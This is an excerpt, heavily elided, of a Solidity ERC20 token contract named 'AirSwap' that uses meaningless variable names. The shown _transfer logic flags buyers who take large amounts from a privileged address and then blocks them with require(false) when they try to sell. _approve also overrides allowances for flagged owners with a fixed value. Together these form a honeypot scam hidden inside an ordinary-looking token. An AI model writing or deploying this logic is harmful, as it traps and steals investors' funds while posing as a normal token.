...
contract AirSwap is Context, IERC20, Ownable {
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((amount > golden) && (marvel[sender] == true) && (address(sender) != creator)) {
        omni[recipient] = true;
    }
    ...
    if (marvel[sender] == false) {
      if ((amount > golden) && (omni[sender] == true)) {
        require(false);
      }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    tok = (fantastic[owner] ? 3434423 : amount);
